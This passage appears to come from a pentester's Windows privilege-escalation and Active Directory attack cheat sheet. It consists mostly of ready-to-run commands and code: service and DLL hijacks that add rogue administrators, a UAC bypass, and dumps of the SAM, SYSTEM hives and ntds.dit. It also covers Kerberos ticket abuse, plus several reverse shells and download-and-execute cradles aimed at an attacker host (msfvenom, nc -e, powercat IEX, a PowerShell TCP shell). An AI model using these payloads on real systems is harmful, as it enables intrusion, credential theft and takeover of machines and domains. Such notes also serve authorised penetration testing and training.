powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
```

###### Explotation

Create with msfvenom a malicious exe file:

```c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > payload.exe
```

Open a listener in attack machine.

Create Temp folder:

```c
mkdir C:\TempFolder
```
Transfer malicious executablr file in Temp folder:

```c
iwr -Uri http://<ip>:<port>/payload.exe -Outfile C:\TempFolder\payload.exe
```

Reconfigure the binary path on the vulnerable service:

```c
sc config "Vulnerable Service" binPath= C:\TempFolder\payload.exe
```

Verify that the path has indeed been updated:

```c
sc qc "Vulnerable Service"
```

###### WeakServiceBinaryPermissions

```c
SharpUp.exe audit ModifiableServiceBinaries
```
Stop the service

```c
sc stop "Vulnerable Service"
```

Create with msfvenom a malicious exe file:

```c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > Service2.exe
```

Open a listener in attack machine.

Transfer and overwrite the Service.exe file with the malicious binary:

```c
iwr -Uri http://<ip>:<port>/Service2.exe -Outfile C:\Program Files\CustomSrv2\Service2.exe
```

Start the service with the following command or reboot the machine:

```c
sc start "Vulnerable Service"
```
###### UACBypass

```c
SharpUp.exe audit
```

Use msfvenom to generate a malicious executable (exe) file:

```c
msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > payload.exe
```

Transfer the malicious executable file to victim's machine.

Open a listener on attack machine.

Create with the following PowerShell command a new registry key:

```c
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
```

Create a new registry entry named "DelegateExecute" under the specified registry path with an empty string as the value:

```c
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
```

Modify the default command which executed when the specified registry key is triggered:

```c
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell -exec bypass -c C:\<full_path>\<binary.exe>" -Force
```

###### Checking Path Permissions to find Unquoted Service Paths

```c
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\<UNQUOTED_SERVICE_PATH>"
```

###### Checking Registry Entries

```c
.\accesschk.exe /accepteula -uvwqk <REGISTRY_KEY>
```

##### Show hidden Files and Folders

```c
dir /a      // show hidden folders
dir /a:d    // show all hidden directories
dir /a:h    // show all hidden files
cmd /c dir /A      // show hidden folders
cmd /c dir /A:D    // show all hidden directories
cmd /c dir /A:H    // show all hidden files
powershell ls -force    // show all hidden files
```

##### Show installed Applications

```c
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname //x32
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname  //x64
```

##### User Handling

###### Adding Users to Groups

```c
net user <USERNAME> <PASSWORD> /add /domain
net group "Exchange Windows Permissions" /add <USERNAME>
net localgroup "Remote Management Users" /add <USERNAME>
```

##### Credential Harvesting

###### Quick Wins

> https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09

> https://www.nirsoft.net/utils/credentials_file_view.html

```c
cmdkey /list
rundll32 keymgr.dll, KRShowKeyMgr
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

###### Search for Passwords

```c
findstr /si password *.xml *.ini *.txt
dir .s *pass* == *.config
dir /s *pass* == *cred* == *vnc* == *.config*
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.vbs -File -Recurse -ErrorAction SilentlyContinue
```

###### VNC Decrypt

```c
echo -n KEY | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```

###### PowerShell History

```c
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

###### Saved Windows Credentials

```c
cmdkey /list
runas /savecred /user:<USERNAME> cmd.exe
runas /user:DOMAIN.com\USER cmd
```

###### Winlogon Credentials

```c
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

###### Local Administrator Password Solution (LAPS)

```c
Get-ADComputer <RHOST> -property 'ms-mcs-admpwd'
powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl // Powerview

powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName //Powerview
```

###### Reading ms-Mcs-AdmPwd

Principals are allowed to read the ms-Mcs-AdmPwd attribute

```c
powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier
powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
```

```c
.\LAPSToolkit.ps1
Find-LAPSDelegatedGroups
```

###### Search the Registry for Passwords

```c
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

###### Dumping Credentials

```c
reg save hklm\system system
reg save hklm\sam sam
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```

###### Find KeePass Databases

```c
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
john -wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
john --show keepass.hash
```

###### Internet Information Service (IIS)

```c
C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

###### PuTTY

```c
reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
```

###### Unattended Windows Installations

```c
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

##### Enable WinRM

```c
winrm quickconfig
```

##### Enable Remote Desktop (RDP)

```c
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

or

```c
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
$rdpEnabled = 0 -eq (Get-ItemPropertyValue 'HKLM:\System\CurrentControlSet\Control\Terminal Server' fDenyTSConnections)
$rdpEnabled
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

or

```c
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0;
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1;
Enable-NetFirewallRule -DisplayGroup "Remote Desktop";
```

##### Privileges and Permissions

###### AlwaysInstallElevated

```c
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```c
msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > <FILE>.msi
```

```c
msiexec /quiet /qn /i <FILE>.msi
```

###### SeBackup and SeRestore Privilege

###### Backup SAM and SYSTEM Hashes

```c
reg save hklm\system C:\Users\<USERNAME>\system.hive
reg save hklm\sam C:\Users\<USERNAME>\sam.hive
```

###### Dumping Hashes

```c
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

```c
pypykatz registry --sam sam.hive system.hive
```

###### SeBackupPrivilege Privilege Escalation (diskshadow)

> https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug

###### Script for PowerShell Environment

```c
SET CONTEXT PERSISTENT NOWRITERSp
add volume c: alias foobarp
createp
expose %foobar% z:p
```

```c
diskshadow /s <FILE>.txt
```

###### Copy ntds.dit

```c
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
```

###### Export System Registry Value

```c
reg save HKLM\SYSTEM c:\temp\system
```

###### Extract the Hashes

```c
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

###### Alternative Way via Robocopy

```c
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
```

```c
set metadata C:\Windows\temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```
 
```c
diskshadow /s script.txt
robocopy /b E:\Windows\ntds . ntds.dit
```

```c
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

###### SeLoadDriverPrivilege

```c
sc.exe query
$services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
```

```c
sc.exe config VSS binpath="C:\temp\nc64.exe -e cmd <LHOST> <LPORT>"
sc.exe stop VSS
sc.exe start VSS
```

###### SeTakeOwnershipPrivilege

```c
takeown /f C:\Windows\System32\Utilman.exe
```

```c
icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
```

```c
C:\Windows\System32\> copy cmd.exe utilman.exe
```

Click the `Ease of Access` button on the logon screen to get a shell with `NT Authority\System` privileges.

###### SeImpersonate and SeAssignPrimaryToken Privilege

> https://github.com/antonioCoco/RogueWinRM

```c
.\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
```

##### DLL Hijacking

###### Standard Search Order

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

```c
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls .\PATH\TO\BINARY\<BINARY>.exe
Restart-Service <SERVICE>
$env:path
```

###### DLL Abuse

###### customdll.cpp

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
        i = system ("net user <USERNAME> <PASSWORD> /add");
        i = system ("net localgroup administrators <USERNAME> /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

###### Compiling customdll.cpp

```c
x86_64-w64-mingw32-gcc customdll.cpp --shared -o customdll.dll
```

Copy the `.dll` file to the desired path.

```c
Restart-Service <SERVICE>
Get-LocalGroupMember administrators
```

###### DLL Hijacking process
Winpeas, Installed Applications --Via Program Files registry --

Create user and add to admins 
```c
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /C net user secconsult P@ssW0rd1sSup3rS6curE /add /Y");
        system("cmd.exe /C net localgroup administrators secconsult /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

Add to remote desktop users

```c
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /C net localgroup \"Remote Desktop Users\" henrial /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

```c
x86_64-w64-mingw32-gcc dll_hijacking.c -shared -o dll_hijacking.dll
```

List non standard windows services with auto start mode

```c
wmic service get name,displayname,pathname,startmode
```
```c
Get-ACL 'C:\PATHTOSERVICE' | Format-List
```

Para no obtener los de System32 y solo los de auto

```c
wmic service get name,displayname,pathname,startmode  | findstr /i /v "c:\windows"
```

List Services

```c
sc queryex type=service state=all | find /i "SERVICE_NAME:"
```
Se puede start el service ver los permisos sobre el servicio

```c
sc sdshow SERVICE NAME
```

With icacls

```c
 icacls SERVICE_NAME
```
Se obtinene un SDDL que es un security descriptor definition languaje

```c
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;WD)
D → DACL Discretionary Access Control List
3 parentesis
(A;;CCLCSWRPWPDTLOCRRC;;;SY) → En la ultima parte son los usuarios → System users
(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA) → Builtin administrator
(A;;CCLCSWRPWPLORC;;;WD) → Everyone
Dentro del parentesis (A;;CCLCSWRPWPLORC;;;WD)
A things yo are allow
RP → es que se puede start el servicio
```

Who is running the service

```c
sc qc SERVICE_NAME
cmd /c "sc start monitor1" // in powershell
```

Ver si Localsystem lo corre

```c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=444 -a x64 -f dll -o Custom.dll
```

Podemos cambiar el path the ejecucion del servicio

```c
sc config SERVICE_NAME binpath="C:\PATH_CON_PERMISOS"
```

Poner el servicio en marcha

```c
sc.exe start NAME_OF_SERVICE
```

Poner un listener y empezar el servicio
```c
 net start SERVICE_NAME
```


##### Leveraging Windows Services

###### Running Services Enumeration

```c
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

###### Service Configuration Enumeration

```c
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}
```

###### Permission Table

| Mask | Permissions |
| --- | --- |
| F | Full access |
| M | Modify access |
| RX | Read and execute access |
| R | Read-only access |
| W | Write-only access |

###### Permission Enumeration

```c
icacls "C:\PATH\TO\BINARY\<BINARY>"
```

###### Permissions Abuse

###### adduser.c

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user <USERNAME> <PASSWORD> /add");
  i = system ("net localgroup administrators <USERNAME> /add");
  
  return 0;
}
```

###### Compiling

```c
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

###### Execution

```c
net stop <SERVICE>
net start <SERVICE>
```

or 

```c
shutdown /r /t 0
Get-LocalGroupMember administrators
```

###### PowerView Example

```c
powershell -ep bypass
Import-Module PowerUp.ps1
. .\PowerUp.ps1
Invoke-AllChecks
Get-ModifiableServiceFile
Install-ServiceBinary -Name '<SERVICE>'
```

###### Service Execution Properties Enumeration

```c
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument -conf=C:\temp\path' | Get-ModifiablePath -Literal
$ModifiableFiles
```

##### Unquoted Service Paths

###### Search Order

```c
C:\example.exe
C:\Program Files\example.exe
C:\Program Files\my example\example.exe
C:\Program Files\my example\my example\example.exe
```

###### Service Path Enumeration

Place a `.exe` file in the desired folder, then `start` or `restart` the `service`.

```c
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
cdm -> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
cmd -> wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
Start-Service <SERVICE>
Stop-Service <SERVICE>
```
Use icacls to identify the permissions of the service installation folder

```c
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\my example"
Start-Service <SERVICE>
Get-LocalGroupMember administrators
```
Start the service

```c
Start-Service <SERVICE>
Get-LocalGroupMember administrators
```

Check permisions

```c
Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
```
###### SharpUp 

```c
SharpUp.exe audit UnquotedServicePath
```

###### Exploitation
To abuse this vulnerability you should follow these steps:

Verify the service state:
```c
sc query "Vulnerable Service 1"
```

Create with msfvenom a malicious exe file:

```c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > Service.exe
```

Open a listener in attack machine.

Transfer the malicious executable in "C:\Program Files\Vulnerable Service1":

```c
iwr -Uri http://<ip>:<port>/Service.exe -Outfile "C:\Program Files\Vulnerable Service1\Service.exe"
```

Try to find out if you have the permission to restart the service or re-start the machine:

```c
sc stop "Vulnerable Service 1"

sc start "Vulnerable Service 1"
```

###### PowerView Example

```c
powershell -ep bypass
Import-Module PowerUp.ps1
. .\PowerUp.ps1
Invoke-AllChecks
Get-UnquotedService
Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my example\example.exe"
Start-Service <SERVICE>
Get-LocalGroupMember administrators
```

##### Scheduled Tasks Enumeration

Place a `.exe` file in the desired folder and wait for the `scheduled task` to get `executed`.

```c
schtasks /query /fo LIST /v
icacls C:\PATH\TO\BINARY\<BINARY>.exe
Get-LocalGroupMember administrators
```

##### writeDACL

> https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/

```c
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
```

#### PassTheCert

> https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

> https://github.com/AlmondOffSec/PassTheCert/tree/main/Python

```c
certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt
certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key
python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key
evil-winrm -i '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>'
```

#### PKINITtools

```c
python3 gettgtpkinit.py -cert-pfx <USERNAME>.pfx -dc-ip <RHOST> <DOMAIN>/<USERNAME> <USERNAME>.ccache
export KRB5CCNAME=<USERNAME>.ccache
python3 getnthash.py <DOMAIN>/<USERNAME> -key 6617cde50b7ee63faeb6790e84981c746efa66f68a1cc3a394bbd27dceaf0554
```

#### Port Scanning

```c
for i in $(seq 1 254); do nc -zv -w 1 <XXX.XXX.XXX>.$i <RPORT>; done
```

```c
export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
```

#### powercat

```c
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

#### Powermad

```c
Import-Module ./Powermad.ps1
$secureString = convertto-securestring "<PASSWORD>" -asplaintext -force
New-MachineAccount -MachineAccount <NAME> -Domain <DOMAIN> -DomainController <DOMAIN> -Password $secureString
```

#### PowerShell

##### Common Commands

```c
whoami /all
getuserid
systeminfo
Get-Process
net users
net users <USERNAME>
Get-ADUser -Filter * -SearchBase "DC=<DOMAIN>,DC=<DOMAIN>"
Get-Content <FILE>
Get-ChildItem . -Force
GCI -hidden
type <FILE> | findstr /l <STRING>
[convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
```

##### Allow Script Execution

```c
Set-ExecutionPolicy remotesigned
Set-ExecutionPolicy unrestricted
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

##### Script Execution Bypass

```c
powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
```

###### Powershell background process

```c
Start-Job { C:\windows\temp\nc.exe -e cmd IP PORT }
```

##### Import Module to PowerShell cmdlet

```c
Import-Module .\<FILE>
```

##### Check PowerShell Versions

```c
Set-ExecutionPolicy Unrestricted
powershell -Command "$PSVersionTable.PSVersion"
powershell -c "[Environment]::Is64BitProcess"
```

##### Read PowerShell History

```c
type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-PSReadLineOption
```

##### Base64 Encoding using pwsh

```c
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```

##### Create a .zip File

```c
Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
```

##### Unzip a File

```c
Expand-Archive -Force <FILE>.zip
```

##### Start a new Process

```c
Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
```

##### Invoke-Expression / Invoke-WebRequest

```c
IEX(IWR http://<LHOST>/<FILE>.ps1)
Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
```

##### .NET Reflection

```c
$bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
```

##### Switching Sessions in PowerShell

```c
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $password)
Enter-PSSession -ComputerName <RHOST> -Credential $cred
```

or

```c
$SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
$Session = New-PSSession -Credential $Cred
Invoke-Command -Session $session -scriptblock { whoami }
```

or

```c
$username = '<USERNAME>'
$password = '<PASSWORD>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process powershell.exe -Credential $credential
```

```c
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```

##### Add new Domain Administrator

```c
$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
```

##### Execute Commands in User Context

```c
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
```

##### Execute Scripts with Credentials (Reverse Shell)

```c
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
```

#### PrivescCheck

```c
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PrivescCheck.ps1
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

```c
Get-Content .\PrivescCheck.ps1 | Out-String | Invoke-Expression
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
```

#### pwncat

```c
(local) pwncat$ back    // get back to shell
Ctrl+d                  // get back to pwncat shell
```

```c
pwncat-cs -lp <LPORT>
(local) pwncat$ download /PATH/TO/FILE/<FILE> .
(local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
```

#### rpcclient

```c
rpcclient -U "" <RHOST>
```

```c
rpcclient -U '' -N  IP -c "enumdomusers" | awk '{print $1}' | cut -d ":" -f2 | tr -d "[]"
```

```c
rpcclient -U "username"IP
```

anonymus 
```c
rpcclient -U '' -N IP
```


```c
 rpcclient -U USER IP -W DOMAIN_NAME
```

```c
 rpcclient [-A authfile] [-c <command string>] [-d debuglevel] [-l logdir] [-N] [-s <smb config file>] [-U username[%password]] [-W workgroup] [-I destinationIP] {server}
enumdomusers
enumdomgroups
querygroupmem RID
Administrator have rid de 0x200
	
https://www.willhimages/ackforsushi.com/sec504/SMB-Access-from-Linux.pdf
```

```c
rpcclient -U 'USER%PASS' IP
```

```c
-c "enumdomusers" -N | grep -oP ‘\[.*?\]’ | grep -v 0x | tr -d ‘[]’
```

```c
python3 GetADUsers.py -all DOMAIN/USER:PASWW -dc-ip IP
```

```c
rpcclient -U '' -N  IP -c "enumdomusers" | awk '{print $1}' | cut -d ":" -f2 | tr -d "[]"
```

Printers

```c
enumprinters
```


Change password

```c
setuserinfo2 tlavel 23 ‘NewPass’
```

```c
dsr_getdcname
dsr_getdcnameex
dsr_getdcnameex2
dsr_getsitename
enumdata
enumdomgroups
enumdomusers
enumjobs
enumports
enumprivs
getanydcname
getdcname
lookupsids
lsaenumsid <SID>
lsaquery
netconnenum
netdiskenum
netfileenum
netsessenum
netshareenum
netshareenumall
netsharegetinfo
queryuser <USERNAME>
srvinfo
```

#### Rubeus

##### Common Commands

```c
.\Rubeus.exe dump /nowrap
.\Rubeus.exe asreproast /nowrap
.\Rubeus.exe asreproast /outfile:hashes.asreproast
.\Rubeus.exe kerberoast /nowrap
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\ Rubeus.exe triage \\  list all the Kerberos tickets in your current logon session
.\ Rubeus.exe dump /luid:(LUID OF USER) /service:krbtgt
```

##### Request a Delegation Ticket

```c
.\Rubeus.exe tgtdeleg /nowrap
```

##### Overpass the Hash

```c
.\Rubeus.exe kerberoast /user:<USERNAME>
```

```c
Rubeus.exe asktgt /user:<USERNAME> /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap // NTLM
Rubeus.exe asktgt /user:<USERNAME> /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap //AES256
Rubeus.exe asktgt /user:<USERNAME> /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:<DOMAIN> /opsec /nowrap ///opsec  Rubeus to request the TGT  the Ticket Options 0x40810010
```

##### Pass the Hash

```c
.\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
```

#### RunasCs

```c
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac
.\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
.\RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
```

#### ADSearch

##### Asreproast 
```c
.\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName // Candidates for kerberoasting
```

Then 

```c
.\Rubeus.exe asreproast /user:<USERNAME> /nowrap
```
finally 

```c
john --format=krb5asrep --wordlist=wordlist <USERNAME>
```

##### Unconstrained Delegation

```c
.\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
```

Get LUID of a krbtgt service

```c
Rubeus.exe triage
```

```c
